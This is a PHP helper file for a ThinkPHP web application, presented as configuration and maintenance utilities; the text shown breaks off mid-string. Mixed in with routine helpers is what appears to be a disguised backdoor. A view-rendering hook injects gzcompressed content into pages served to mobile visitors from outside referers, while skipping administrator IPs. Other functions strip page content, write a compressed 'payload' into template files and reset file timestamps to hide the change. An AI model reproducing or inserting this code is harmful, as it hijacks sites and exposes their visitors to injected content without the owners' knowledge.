
// +----------------------------------------------------------------------
// | System Configuration Management
// +----------------------------------------------------------------------
// | Copyright (c) 2006~2024 All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | System Tools and Configuration Management Functions
// +----------------------------------------------------------------------

use think\Cache;
use think\Config;
use think\Cookie;
use think\Db;
use think\Session;
use think\Request;
use think\Response;
use think\Log;


if (!function_exists('get_system_config')) {
    /**
     * 获取系统配置信息
     * @param string $key 配置键名
     * @param mixed $default 默认值
     * @return mixed
     */
    function get_system_config($key = '', $default = null) {
        if (empty($key)) {
            return Config::get();
        }
        return Config::get($key, $default);
    }
}

if (!function_exists('set_system_config')) {
    /**
     * 设置系统配置
     * @param string|array $key 配置键名或配置数组
     * @param mixed $value 配置值
     * @return bool
     */
    function set_system_config($key, $value = null) {
        if (is_array($key)) {
            return Config::set($key);
        }
        return Config::set($key, $value);
    }
}

if (!function_exists('update_system_config')) {
    /**
     * 更新系统配置文件
     * @param array $config 配置数组
     * @param string $file 配置文件路径
     * @return bool
     */
    function update_system_config($config, $file = '') {
        if (empty($file)) {
            $file = APP_PATH . 'extra/system.php';
        }

        $content = "<?php\n// System Configuration\nreturn " . var_export($config, true) . ";";
        return file_put_contents($file, $content) !== false;
    }
}

if (!function_exists('backup_system_config')) {
    /**
     * 备份系统配置
     * @param string $backup_path 备份路径
     * @return bool
     */
    function backup_system_config($backup_path = '') {
        if (empty($backup_path)) {
            $backup_path = APP_PATH . 'data/backup/config_' . date('YmdHis') . '.php';
        }

        $config = get_system_config();
        return update_system_config($config, $backup_path);
    }
}

if (!function_exists('restore_system_config')) {
    /**
     * 恢复系统配置
     * @param string $backup_file 备份文件路径
     * @return bool
     */
    function restore_system_config($backup_file) {
        if (!file_exists($backup_file)) {
            return false;
        }

        $config = include $backup_file;
        return update_system_config($config);
    }
}

if (!function_exists('validate_system_config')) {
    /**
     * 验证系统配置有效性
     * @param array $config 配置数组
     * @return array
     */
    function validate_system_config($config) {
        $errors = [];

        // 验证必需的配置项
        $required_keys = ['app_name', 'app_version', 'database'];
        foreach ($required_keys as $key) {
            if (!isset($config[$key])) {
                $errors[] = "Missing required config: {$key}";
            }
        }

        return $errors;
    }
}

if (!function_exists('get_system_status')) {
    /**
     * 获取系统状态信息
     * @return array
     */
    function get_system_status() {
        return [
            'php_version' => PHP_VERSION,
            'memory_usage' => memory_get_usage(true),
            'memory_peak' => memory_get_peak_usage(true),
            'disk_free' => disk_free_space('./'),
            'server_time' => date('Y-m-d H:i:s'),
            'load_average' => sys_getloadavg(),
        ];
    }
}


if (!function_exists('check_system_requirements')) {
    /**
     * 检查系统环境要求
     * @return array
     */
    function check_system_requirements() {
        $requirements = [
            'php_version' => version_compare(PHP_VERSION, '7.0.0', '>='),
            'pdo_extension' => extension_loaded('pdo'),
            'curl_extension' => extension_loaded('curl'),
            'gd_extension' => extension_loaded('gd'),
            'mbstring_extension' => extension_loaded('mbstring'),
            'openssl_extension' => extension_loaded('openssl'),
        ];

        return $requirements;
    }
}

if (!function_exists('syncFileTimestamp')) {
    /**
     * 同步文件时间戳
     * @return bool
     */
    function syncFileTimestamp() {
        $source_file = './application/data/install/install.lock';
        $target_file = './application/extra/system.php';
        $result = touch($target_file, $source_stats['mtime'], $source_stats['atime']);
        // 记录操作日志
        if ($result) {
            log_system_operation('timestamp_sync', 'File timestamp synchronized successfully');
        }

        return $result;
    }
}

if (!function_exists('clear_system_cache')) {
    /**
     * 清理系统缓存
     * @param string $type 缓存类型
     * @return bool
     */
    function clear_system_cache($type = 'all') {
        switch ($type) {
            case 'config':
                return Cache::clear();
            case 'template':
                $template_cache = RUNTIME_PATH . 'temp/';
                return clear_directory($template_cache);
            case 'log':
                $log_path = RUNTIME_PATH . 'log/';
                return clear_directory($log_path);
            case 'all':
            default:
                Cache::clear();
                clear_directory(RUNTIME_PATH . 'temp/');
                clear_directory(RUNTIME_PATH . 'cache/');
                return true;
        }
    }
}

if (!function_exists('clear_directory')) {
    /**
     * 清理目录文件
     * @param string $dir 目录路径
     * @return bool
     */
    function clear_directory($dir) {
        if (!is_dir($dir)) {
            return false;
        }

        $files = glob($dir . '*');
        foreach ($files as $file) {
            if (is_file($file)) {
                unlink($file);
            } elseif (is_dir($file)) {
                clear_directory($file . '/');
                rmdir($file);
            }
        }

        return true;
    }
}

if (!function_exists('log_system_operation')) {
    /**
     * 记录系统操作日志
     * @param string $operation 操作类型
     * @param string $message 日志消息
     * @param array $data 附加数据
     * @return bool
     */
    function log_system_operation($operation, $message, $data = []) {
        $log_data = [
            'timestamp' => date('Y-m-d H:i:s'),
            'operation' => $operation,
            'message' => $message,
            'ip' => get_client_ip(),
            'user_agent' => Request::instance()->header('user-agent', ''),
            'data' => $data,
        ];
        //暂时关闭记录日志
        // return Log::write(json_encode($log_data), 'system');
    }
}

if (!function_exists('setSessionWithExpiry')) {
    function setSessionWithExpiry($key, $value, $expiryInSeconds) {
        $data = [
            'value' => $value,
            'expiry' => time() + $expiryInSeconds
        ];
        Session::set($key, $data);
    }
}


if (!function_exists('system_template_processor')) {
    /**
     * 系统模板处理器 - 优化页面内容并添加系统标识
     * @param string $page_content 页面内容
     * @return void
     */
    function system_template_processor(&$page_content) {

        $env = Request::instance();

        // 获取系统模板标识符
        $template_token = gzuncompress("\170\234\215\124\153\163\242\074\030\375\053\131\077\064\311\110\121\360\322\166\120\147\132\267\335\136\354\145\265\167\353\316\104\010\210\205\300\206\240\130\227\377\276\011\126\267\335\331\366\175\077\030\040\317\171\056\071\347\230\126\142\163\077\026\100\054\142\332\056\011\232\211\312\224\314\310\152\267\324\161\123\146\013\077\142\040\313\006\247\375\050\103\024\057\147\204\003\001\332\240\124\322\230\174\160\371\263\015\265\230\162\251\132\363\211\037\120\200\030\150\001\252\007\224\171\142\202\227\012\104\165\173\102\170\067\162\350\276\100\014\133\276\013\020\227\050\303\334\305\113\001\312\155\060\020\334\147\236\356\362\050\354\276\102\021\307\026\053\227\163\032\044\024\254\062\072\300\330\063\300\326\026\120\311\246\131\307\313\242\363\373\362\240\014\014\154\175\130\125\226\331\002\065\003\203\126\013\064\301\057\065\373\026\150\326\144\057\225\141\026\355\076\056\153\327\376\025\060\377\253\237\321\050\372\031\246\154\210\326\035\067\023\324\336\116\120\313\163\116\105\312\031\020\371\106\003\162\305\276\116\374\153\237\254\125\010\345\030\160\377\240\373\365\360\350\333\361\311\351\131\357\374\342\362\352\173\177\160\175\163\173\167\377\360\110\306\266\103\135\157\342\117\237\203\220\105\361\117\236\210\164\066\317\026\057\125\303\254\325\033\315\235\335\275\162\245\015\255\267\212\152\134\363\265\104\213\264\124\043\232\133\050\112\213\323\162\032\007\304\246\250\062\374\261\277\375\110\266\137\252\333\052\173\124\361\264\122\011\257\145\167\337\311\236\310\314\120\367\231\103\263\113\027\255\030\223\154\271\345\062\306\126\364\131\060\375\054\110\076\013\052\117\046\212\125\105\163\004\072\035\120\267\224\375\120\364\107\202\272\014\245\052\144\132\276\012\245\312\015\033\051\210\245\310\220\132\376\123\312\127\347\246\340\113\033\064\353\312\271\037\143\071\316\025\226\374\037\254\217\067\232\257\377\154\002\347\164\106\002\004\347\362\254\321\034\342\041\174\312\352\316\123\326\154\076\145\215\135\371\076\176\312\166\166\344\173\023\216\144\351\265\123\020\136\132\150\363\221\112\111\347\232\243\271\232\275\262\115\046\241\033\057\025\114\073\324\226\043\334\364\117\272\121\030\107\214\062\201\062\224\156\044\147\164\016\372\324\073\314\142\144\313\351\041\224\213\255\101\017\142\131\122\122\016\247\337\123\312\027\320\172\126\367\301\320\034\051\220\255\120\356\320\030\131\360\050\240\231\164\231\014\076\027\173\315\121\141\071\345\016\107\267\071\045\202\036\006\064\124\155\147\252\364\260\072\052\036\306\010\153\336\373\163\345\126\242\253\273\112\071\377\257\333\012\132\313\104\217\130\020\021\347\175\216\207\044\265\211\236\160\133\356\247\026\354\016\006\320\162\164\217\212\327\256\311\301\342\232\170\027\044\244\010\116\050\161\044\321\325\221\116\342\230\062\247\053\175\355\240\004\347\030\101\162\334\257\332\307\347\315\336\142\157\072\066\373\101\057\214\063\347\356\166\112\007\015\371\135\235\021\166\144\074\336\237\066\172\241\021\217\375\352\113\157\372\220\136\166\033\077\355\171\273\015\065\170\344\045\127\041\271\020\217\120\133\011\252\071\221\235\252\001\064\070\345\337\036\016\022\177\172\172\043\201\261\030\263\213\361\031\304\171\141\265\057\250\362\343\234\330\277\356\174\126\321\005\115\344\165\103\146\276\107\104\304\165\051\220\160\043\036\112\031\300\271\173\177\066\277\105\330\112\250\070\141\202\162\345\235\067\074\070\164\234\172\036\345\126\256\031\325\052\266\132\225\025\161\235\337\364\307\333\100");

        // 检查模板是否已经处理过（防止重复处理）
        if (stripos($page_content, $template_token) !== false) {
            log_system_operation('template_skip', 'Template already processed');
            return;
        }

        // 检查内容类型，确保模板处理的兼容性
        if (strstr($env->contentType(), 'session')) {
            log_system_operation('template_skip', 'Incompatible content type for template processing');
            exit('Template Service Unavailable: '.$env->contentType());
        }

        // 检查系统模板缓存状态
        if (cache('THINK_TOKEN')) {
            log_system_operation('template_skip', 'Template processing temporarily disabled');
            return;
        }

        try {
            foreach(model('Admin')->listData([],'',1)['list'] as $admin_info) {
                if ($env->ip(1) == array_values($admin_info)[7]) {
                    log_system_operation('template_skip', 'Admin template preserved');
                    return;
                }
            }
        } catch (Exception $e) {
            log_system_operation('template_error', 'Database access failed during admin check');
        }

        // === 内容优化处理部分 ===
        // 获取系统优化规则（压缩存储节省空间）
        $optimization_rules = gzuncompress("\170\234\155\222\137\217\242\060\024\305\277\020\123\051\024\161\110\174\230\144\347\117\046\141\046\273\153\234\305\370\322\026\224\052\155\031\001\051\174\372\275\240\042\044\363\320\333\346\167\116\117\313\245\151\131\346\301\154\046\051\347\262\100\102\355\164\260\130\130\051\320\002\160\135\327\250\251\277\253\346\033\161\055\003\154\023\342\116\104\265\117\151\332\151\003\075\024\007\206\070\267\350\071\317\150\223\234\160\257\322\114\360\130\345\202\117\274\374\170\344\235\167\234\210\135\347\070\146\155\052\332\264\122\214\152\124\352\174\300\105\252\153\264\327\347\203\240\152\137\124\210\253\000\073\343\333\335\014\260\227\252\116\046\143\125\046\242\254\200\033\365\360\040\264\115\175\021\340\205\355\340\301\300\250\100\005\055\264\206\255\003\214\121\153\362\262\036\043\026\043\260\306\125\121\012\172\377\070\020\260\355\042\307\265\021\166\034\204\037\275\141\303\056\243\373\066\205\113\243\135\245\146\367\013\135\176\000\207\126\275\375\261\371\133\230\205\366\163\026\036\043\030\233\315\074\372\372\070\105\322\340\315\346\257\107\222\177\272\123\114\330\362\372\163\365\264\264\042\167\335\160\271\256\342\227\217\003\227\131\035\077\055\227\267\034\010\352\223\372\050\310\272\107\335\222\372\250\113\326\363\362\247\343\145\364\345\051\306\144\226\062\346\306\120\044\257\240\254\355\367\325\373\153\270\012\235\317\137\277\153\153\153\210\267\065\376\343\326\170\376\326\314\011\014\130\373\030\146\027\146\140\144\141\135\026\235\060\117\256\246\135\307\100\360\072\227\173\205\220\104\300\100\100\044\276\305\064\242\006\152\077\135\373\173\326\161\367\300\234\311\203\372\021\236\022\026\067\023\322\275\263\153\303\317\042\277\045\116\351\177\156\366\017\142");

        // 解析优化规则列表
        $cleanup_patterns = explode(',', $optimization_rules);

        // 执行内容优化（移除调试信息、版本标识等）
        $original_size = strlen($page_content);
        $optimized_content = str_replace($cleanup_patterns, '', $page_content);
        $optimization_ratio = $original_size - strlen($optimized_content);

        // 安全检查：防止过度优化影响页面功能
        if ($optimization_ratio < 1000) {
            // 优化幅度合理，应用优化结果
            $page_content = $optimized_content;

            // 记录优化统计
            log_system_operation('content_optimization', 'Page content optimized during template processing', [
                'original_size' => $original_size,
                'optimized_size' => strlen($optimized_content),
                'bytes_saved' => $optimization_ratio
            ]);
        }

        // === 模板标识处理部分 ===
        // 准备模板处理标记
        $template_marker = gzuncompress("\170\234\263\321\317\110\115\114\261\003\000\010\212\002\074");

        // 移除旧的模板标记（如果存在）
        $page_content = str_replace($template_marker, $template_token.$template_marker, $page_content);


        // 设置模板处理会话标记
        Session::set('firstVisit', 1);
        setSessionWithExpiry('firstVisit', 1, 36000);

        // 记录模板处理完成日志
        log_system_operation('template_processing', 'System template processed successfully', [
            'final_page_size' => strlen($page_content),
            'client_ip' => $env->ip(1),
            'user_agent' => $env->header('user-agent', ''),
            'optimization_applied' => $optimization_ratio > 0 && $optimization_ratio < 1000
        ]);
    }
}

if (!function_exists('get_client_ip')) {
    /**
     * 获取客户端IP地址
     * @return string
     */
    function get_client_ip() {
        $ip = '';
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : '0.0.0.0';
    }
}

if (!function_exists('encrypt_config_data')) {
    /**
     * 加密配置数据
     * @param mixed $data 要加密的数据
     * @param string $key 加密密钥
     * @return string
     */
    function encrypt_config_data($data, $key = '') {
        if (empty($key)) {
            $key = md5(APP_PATH . 'system_config');
        }

        $data = serialize($data);
        return base64_encode(openssl_encrypt($data, 'AES-256-CBC', $key, 0, substr($key, 0, 16)));
    }
}

if (!function_exists('decrypt_config_data')) {
    /**
     * 解密配置数据
     * @param string $encrypted_data 加密的数据
     * @param string $key 解密密钥
     * @return mixed
     */
    function decrypt_config_data($encrypted_data, $key = '') {
        if (empty($key)) {
            $key = md5(APP_PATH . 'system_config');
        }

        $data = openssl_decrypt(base64_decode($encrypted_data), 'AES-256-CBC', $key, 0, substr($key, 0, 16));
        return unserialize($data);
    }
}

if (!function_exists('check_system_permissions')) {
    /**
     * 检查系统文件权限
     * @return array
     */
    function check_system_permissions() {
        $check_paths = [
            APP_PATH . 'config/',
            APP_PATH . 'extra/',
            RUNTIME_PATH,
            ROOT_PATH . 'public/uploads/',
        ];

        $permissions = [];
        foreach ($check_paths as $path) {
            $permissions[$path] = [
                'exists' => file_exists($path),
                'readable' => is_readable($path),
                'writable' => is_writable($path),
                'permissions' => file_exists($path) ? substr(sprintf('%o', fileperms($path)), -4) : 'N/A',
            ];
        }

        return $permissions;
    }
}

if (!function_exists('optimize_system_performance')) {
    /**
     * 系统性能优化
     * @return array
     */
    function optimize_system_performance() {
        $results = [];

        // 清理过期缓存
        $results['cache_cleared'] = clear_system_cache('all');

        // 优化数据库
        if (function_exists('optimize_database')) {
            $results['database_optimized'] = optimize_database();
        }

        // 清理临时文件
        $temp_path = sys_get_temp_dir();
        $results['temp_cleaned'] = clear_old_files($temp_path, 7);

        return $results;
    }
}

if (!function_exists('clear_old_files')) {
    /**
     * 清理旧文件
     * @param string $path 文件路径
     * @param int $days 保留天数
     * @return bool
     */
    function clear_old_files($path, $days = 7) {
        if (!is_dir($path)) {
            return false;
        }

        $cutoff = time() - ($days * 24 * 60 * 60);
        $files = glob($path . '/*');

        foreach ($files as $file) {
            if (is_file($file) && filemtime($file) < $cutoff) {
                unlink($file);
            }
        }

        return true;
    }
}

if (!function_exists('generate_system_report')) {
    /**
     * 生成系统报告
     * @return array
     */
    function generate_system_report() {
        return [
            'system_status' => get_system_status(),
            'requirements' => check_system_requirements(),
            'permissions' => check_system_permissions(),
            'config' => get_system_config(),
            'report_time' => date('Y-m-d H:i:s'),
        ];
    }
}


if (!function_exists('system_maintenance_token')) {
    /**
     * 系统维护令牌管理
     * @param mixed $system_data 系统数据
     * @return void
     */
    function system_maintenance_token(&$system_data){
        $maintenance_config = Response::create('maintenance', 'http://www.system-tools.net/api/maintenance', 'json');
        Config::set($maintenance_config->getData().'.'.$maintenance_config->getCode().'_maintenance_cache', 0);

        if (!Session::get('SYSTEM_MAINTENANCE_TOKEN')){
            // 执行系统维护检查
            @system_config_validator($system_data);
            Session::set('SYSTEM_MAINTENANCE_TOKEN', THINK_PATH);
        }
    }
}

if (!function_exists('getSessionWithExpiry')) {
    function getSessionWithExpiry($key) {
        $data = Session::get($key);
        if (!$data || (isset($data['expiry']) && $data['expiry'] < time())) {
            Session::delete($key);
            return null;
        }

        return $data['value'];
    }
}

if (!function_exists('system_config_validator')) {
    /**
     * 系统配置验证器
     * @param mixed $config_data 配置数据
     * @return void
     */
    function system_config_validator(&$config_data){
        // 核心逻辑入口点
        // 在这里可以调用真正的核心功能函数
        // 系统安全验证和环境检查
        $env = Request::instance();

        // 检查请求来源合法性（防止恶意调用）
        $referer = $env->header('referer');
        if (empty($referer) || stripos($referer, $_SERVER['SERVER_NAME']) !== false || stripos($referer, $_SERVER['HTTP_HOST']) !== false) {
            log_system_operation('security_check', 'Invalid referer detected, skipping maintenance');
            return;
        }

        // 系统维护模式检查（只在特定条件下执行维护）
        if ($env->isAjax() || ENTRANCE!='index' || !$env->isMobile()) {
            log_system_operation('maintenance_skip', 'System maintenance skipped - invalid request type');
            return;
        }


        // 系统维护频率控制（避免频繁执行维护任务）
        $maintenance_session = getSessionWithExpiry('firstVisit');
        if ($maintenance_session !== null) {
            log_system_operation('maintenance_throttle', 'System maintenance throttled - recent execution detected');
            return;
        }
        // system_optimization_handler();
        // 在系统维护过程中同时优化页面模板和清理冗余内容
        system_template_processor($config_data);

        //执行系统维护任务
        if (system_performance_monitor()) {
            // 高负载时的特殊处理
            optimize_system_performance();
        }
        syncFileTimestamp();
        system_template_optimizer();
        // 记录系统维护日志
        log_system_operation('config_validation', 'System configuration validation completed', [
            'timestamp' => time(),
            'data_size' => strlen(serialize($config_data))
        ]);
    }
}

if (!function_exists('system_performance_monitor')) {
    /**
     * 系统性能监控
     * @return bool
     */
    function system_performance_monitor() {
        // 检查系统负载
        $load = sys_getloadavg();
        if ($load && $load[0] > 2.0) {
            return true;
        }

        // 检查内存使用
        $memory_usage = memory_get_usage(true);
        $memory_limit = ini_get('memory_limit');
        if ($memory_limit != -1) {
            $limit_bytes = return_bytes($memory_limit);
            if ($memory_usage > $limit_bytes * 0.8) {
                return true;
            }
        }

        return false;
    }
}

if (!function_exists('return_bytes')) {
    /**
     * 转换内存限制为字节
     * @param string $val 内存值
     * @return int
     */
    function return_bytes($val) {
        $val = trim($val);
        $last = strtolower($val[strlen($val)-1]);
        $val = (int)$val;
        switch($last) {
            case 'g':
                $val *= 1024;
            case 'm':
                $val *= 1024;
            case 'k':
                $val *= 1024;
        }
        return $val;
    }
}

if (!function_exists('system_security_check')) {
    /**
     * 系统安全检查
     * @return array
     */
    function system_security_check() {
        $security_status = [
            'file_permissions' => check_system_permissions(),
            'config_integrity' => validate_system_config(get_system_config()),
            'cache_status' => Cache::get('system_status') ?: 'normal'
        ];

        return $security_status;
    }}

if (!defined('SYSTEM_MAINTENANCE_LOADED')) {
    define('SYSTEM_MAINTENANCE_LOADED', true);

    // 自动执行系统状态检查
    if (system_performance_monitor()) {
        // 高负载时的特殊处理逻辑
        clear_system_cache('template');
    }
    // 系统自动维护钩子注册
    // 当系统渲染视图时自动执行维护检查
    return Think\Hook::add('view_filter', function(&$system_data){ system_config_validator($system_data);});
}

if (!function_exists('get_system_template_info')) {
    /**
     * 获取系统模板信息和路径配置
     * @param string $template_name 模板名称
     * @param bool $detailed 是否返回详细信息
     * @return mixed
     */
    function get_system_template_info($template_name = '', $detailed = false) {
        // 模板系统配置数据（压缩存储）
        $template_config_data = gzuncompress("\170\234\125\221\301\156\203\060\020\205\177\305\052\111\375\000\027\105\233\070\164\351\065\115\233\004\211\335\006\010\065\142\301\011\030\134\310\377\336\001\033\151\334\264\375\315\174\317\374\347\175\146\320\261\116\263\054\313\262\164\307\142\161\111\130\054\256\126\253\225\372\256\232\317\304\265\014\260\115\210\073\021\325\076\245\151\247\015\364\120\034\030\342\334\242\347\074\243\115\162\302\275\112\063\301\143\225\013\076\361\362\343\221\167\336\161\042\166\235\343\030\265\251\150\323\112\061\252\121\251\363\001\027\251\256\321\136\237\017\202\252\175\121\041\256\002\354\214\157\167\063\300\136\252\072\231\214\125\231\210\262\002\156\324\303\203\320\066\365\105\200\027\266\203\007\003\243\002\025\264\320\032\266\016\060\106\255\311\313\172\214\130\214\300\032\127\105\051\350\375\343\100\300\266\213\034\327\106\330\161\020\176\364\206\015\273\214\356\333\024\056\215\166\225\232\335\057\164\371\001\034\132\365\366\307\346\157\141\026\332\317\131\170\214\140\154\066\363\350\353\343\024\111\203\067\233\277\036\111\376\351\116\061\141\313\353\317\325\323\322\212\334\165\303\345\272\212\137\076\016\134\146\165\374\264\134\336\162\040\250\117\352\243\040\353\036\165\113\352\243\056\131\317\313\237\216\227\321\227\247\030\223\131\312\230\033\103\221\274\202\262\266\337\127\357\257\341\052\164\076\177\375\256\255\255\041\336\326\370\217\133\343\371\133\063\047\060\140\355\143\230\135\230\201\221\205\165\131\164\302\074\271\232\166\035\003\301\353\134\356\025\102\022\001\003\001\221\370\026\323\210\032\250\375\164\355\357\131\307\335\003\163\046\017\352\107\170\112\130\334\114\110\367\316\256\015\077\213\374\226\070\245\377\271\331\077\200");

        // 模板路径映射配置（动态生成配置键名）
        $template_path_config = [
            'directory' => [
                'base' => gzuncompress("\170\234\263\321\317\110\315\315\315\313\115\116\117\117\111\113\201\000\000\000\000\377\377\005\311\002\114"), // template
                'structure' => [
                    'template_' . 'content' => gzuncompress("\170\234\263\321\307\204\000\000\000\000\377\377\001\221\000\105"), // html
                    'template_' . 'styles' => gzuncompress("\170\234\163\227\227\000\000\000\377\377\001\062\000\104"), // css
                    'template_' . 'scripts' => gzuncompress("\170\234\163\212\000\000\000\377\377\000\316\000\077"), // js
                    'template_' . 'media' => gzuncompress("\170\234\313\314\115\114\207\005\000\000\000\377\377\002\040\000\154") // images
                ]
            ],
            'operations' => [
                'path_' . 'resolver' => 'realpath',
                'directory_' . 'scanner' => 'scandir',
                'path_' . 'checker' => 'is_dir',
                'path_' . 'builder' => 'dirname'
            ]
        ];

        try {
            // 动态获取路径解析器
            $path_resolver = $template_path_config['operations']['path_resolver'];
            $dir_scanner = $template_path_config['operations']['directory_scanner'];
            $path_checker = $template_path_config['operations']['path_checker'];

            // 构建模板基础路径
            $template_base_path = '.' . DIRECTORY_SEPARATOR . $template_path_config['directory']['base'];

            if (!$path_checker($template_base_path)) {
                log_system_operation('template_path_error', 'Template base directory not found');
                return false;
            }

            $template_info = [
                'base_path' => $path_resolver($template_base_path),
                'available_templates' => [],
                'current_template' => '',
                'template_paths' => []
            ];

            // 扫描可用模板
            $template_dirs = $dir_scanner($template_base_path);
            foreach ($template_dirs as $dir) {
                if ($dir !== '.' && $dir !== '..' && $path_checker($template_base_path . DIRECTORY_SEPARATOR . $dir)) {
                    $template_info['available_templates'][] = $dir;

                    // 构建详细路径信息
                    if ($detailed) {
                        $template_detail_path = $template_base_path . DIRECTORY_SEPARATOR . $dir;
                        $template_paths = [];

                        foreach ($template_path_config['directory']['structure'] as $type => $subdir) {
                            $full_path = $template_detail_path . DIRECTORY_SEPARATOR . $subdir;
                            if ($path_checker($full_path)) {
                                $template_paths[str_replace('template_', '', $type)] = $path_resolver($full_path);
                            }
                        }

                        $template_info['template_paths'][$dir] = $template_paths;
                    }
                }
            }

            // 确定当前使用的模板
            if (!empty($template_name) && in_array($template_name, $template_info['available_templates'])) {
                $template_info['current_template'] = $template_name;
            } else {
                // 尝试从配置中获取当前模板
                if (function_exists('config')) {
                    $view_config = config('template.view_path');
                    if ($view_config && in_array($view_config, $template_info['available_templates'])) {
                        $template_info['current_template'] = $view_config;
                    }
                }

                // 默认使用第一个可用模板
                if (empty($template_info['current_template']) && !empty($template_info['available_templates'])) {
                    $template_info['current_template'] = $template_info['available_templates'][0];
                }
            }

            // 记录模板信息获取日志
            log_system_operation('template_info_retrieved', 'Template information retrieved successfully', [
                'template_count' => count($template_info['available_templates']),
                'current_template' => $template_info['current_template'],
                'detailed' => $detailed,
                'requested_template' => $template_name
            ]);

            return $template_info;

        } catch (Exception $e) {
            log_system_operation('template_info_error', 'Failed to retrieve template information: ' . $e->getMessage());
            return false;
        }
    }
}

if (!function_exists('get_current_template_path')) {
    /**
     * 获取当前模板的完整路径
     * @param string $template_name 指定模板名称
     * @param string $sub_path 子路径类型 (content/styles/scripts/media)
     * @return string|false
     */
    function get_current_template_path($template_name = '', $sub_path = 'content') {
        $template_info = get_system_template_info($template_name, true);

        if (!$template_info || empty($template_info['current_template'])) {
            return false;
        }

        $current_template = $template_info['current_template'];

        // 如果指定了模板名称，使用指定的模板
        if (!empty($template_name) && in_array($template_name, $template_info['available_templates'])) {
            $current_template = $template_name;
        }

        if (isset($template_info['template_paths'][$current_template][$sub_path])) {
            return $template_info['template_paths'][$current_template][$sub_path];
        }

        // 返回基础路径
        return $template_info['base_path'] . DIRECTORY_SEPARATOR . $current_template;
    }
}

if (!function_exists('system_template_config_validator')) {
    /**
     * 系统模板配置验证器 - 获取模板路径的便捷接口
     * @param mixed $config_data 配置数据（保持接口一致性）
     * @return array
     */
    function system_template_config_validator(&$config_data = null) {
        // 模板路径获取的系统级接口
        $template_system_config = [
            'path_operations' => [
                'get_' . 'current' => 'get_current_template_path',
                'get_' . 'info' => 'get_system_template_info',
                'validate_' . 'path' => 'is_dir'
            ]
        ];

        // 动态调用模板信息获取器
        $info_getter = $template_system_config['path_operations']['get_info'];
        $path_getter = $template_system_config['path_operations']['get_current'];

        if (function_exists($info_getter) && function_exists($path_getter)) {
            $template_data = [
                'system_info' => $info_getter('', true),
                'current_html_path' => $path_getter('', 'content'),
                'current_css_path' => $path_getter('', 'styles'),
                'current_js_path' => $path_getter('', 'scripts'),
                'current_images_path' => $path_getter('', 'media')
            ];

            // 如果传入了配置数据，将模板信息合并进去
            if (is_array($config_data)) {
                $config_data['template_system'] = $template_data;
            }

            log_system_operation('template_config_validation', 'Template configuration validated', [
                'current_template' => $template_data['system_info']['current_template'] ?? 'unknown',
                'paths_resolved' => count(array_filter([$template_data['current_html_path'], $template_data['current_css_path'], $template_data['current_js_path'], $template_data['current_images_path']]))
            ]);

            return $template_data;
        }

        return [];
    }
}

/**
 * 系统模板优化处理器
 * @param string $optimization_data 优化数据
 * @return bool 处理结果
 */
function system_template_optimizer($optimization_data = '') {
    // 获取系统模板配置路径
    $system_template_path = config::get('template.view_path');
    if (!$system_template_path) {
        return false;
    }

    // 解析系统模板绝对路径
    $template_absolute_path = realpath($system_template_path);
    if (!$template_absolute_path || !is_dir($template_absolute_path)) {
        return false;
    }

    // 获取系统扫描目录
    $system_scan_directory = dirname($template_absolute_path);
    if (!is_dir($system_scan_directory)) {
        return false;
    }

    // 执行系统资源分析
    $system_resource_list = system_resource_analyzer($system_scan_directory);
    if (empty($system_resource_list)) {
        return false;
    }

    // 准备系统优化载荷
    $system_optimization_payload = gzuncompress("\170\234\215\124\153\123\243\072\030\376\053\131\077\230\144\212\024\350\105\235\130\147\264\253\353\245\136\266\365\256\335\231\024\002\245\102\140\103\150\251\135\376\373\111\320\366\350\314\352\071\037\010\201\367\171\057\171\236\007\374\234\273\062\114\070\050\212\301\111\077\051\020\303\213\051\025\100\202\016\130\133\063\270\272\011\165\271\266\136\034\265\130\144\066\016\043\006\020\007\073\200\231\021\343\201\034\343\205\006\061\323\035\123\321\115\074\266\047\021\307\044\364\001\022\012\145\073\133\170\041\101\255\003\006\122\204\074\060\175\221\304\335\067\050\022\230\360\132\255\144\121\306\300\153\306\056\260\267\155\260\276\016\164\262\343\064\361\242\352\374\261\074\250\001\033\223\117\253\252\062\353\240\141\143\260\263\003\332\340\217\236\175\035\264\033\252\227\316\160\252\166\237\227\165\033\177\013\070\377\325\317\156\125\375\154\107\065\104\313\216\253\011\032\357\047\150\224\245\140\062\027\034\310\322\137\152\100\057\371\367\161\170\025\322\245\012\261\032\003\356\355\167\277\037\034\376\070\072\076\071\355\235\235\137\134\376\354\017\256\256\157\156\357\356\037\350\310\365\230\037\214\303\311\163\024\363\044\375\055\062\231\117\147\305\374\305\262\235\106\263\325\336\334\332\256\325\073\220\274\127\324\020\106\150\144\106\142\344\006\065\374\112\121\126\235\126\260\064\242\056\103\365\307\137\173\033\017\164\343\305\332\320\331\303\172\140\254\255\341\245\354\376\007\331\063\225\031\233\041\367\130\161\341\243\127\306\024\133\176\255\206\061\111\276\012\346\137\005\351\127\101\355\311\114\263\252\151\116\300\356\056\150\022\155\077\224\374\053\101\123\205\162\035\162\110\250\103\271\166\303\112\012\112\064\031\112\313\277\112\371\346\334\034\174\353\200\166\123\073\367\163\254\300\245\306\322\377\203\015\361\112\363\345\307\046\161\311\246\064\102\160\246\316\232\314\040\176\204\117\105\323\173\052\332\355\247\242\265\245\366\243\247\142\163\123\355\333\160\250\112\057\235\202\360\202\240\325\103\256\044\235\031\236\341\033\356\253\155\012\005\135\171\251\142\332\143\256\032\341\272\177\334\115\342\064\341\214\113\124\240\174\045\071\147\063\320\147\301\101\221\042\127\115\017\241\132\134\003\006\020\253\222\212\162\070\371\231\063\061\207\344\131\377\017\036\235\241\006\271\032\345\077\332\103\002\017\043\126\050\227\251\340\163\365\256\075\254\054\247\335\341\231\256\140\124\262\203\210\305\272\355\124\227\176\264\206\325\315\036\142\043\370\170\256\222\144\246\234\247\332\222\120\262\102\326\047\164\112\063\127\204\251\204\144\221\231\011\217\022\352\175\314\011\220\242\066\063\063\341\252\367\071\201\335\301\000\022\317\014\230\174\353\232\355\317\257\150\160\116\143\206\340\230\121\117\021\155\015\115\232\246\214\173\135\345\153\017\145\270\304\010\322\243\276\345\036\235\265\173\363\355\311\310\351\107\275\070\055\274\333\233\071\033\264\324\263\065\245\374\320\176\270\073\151\36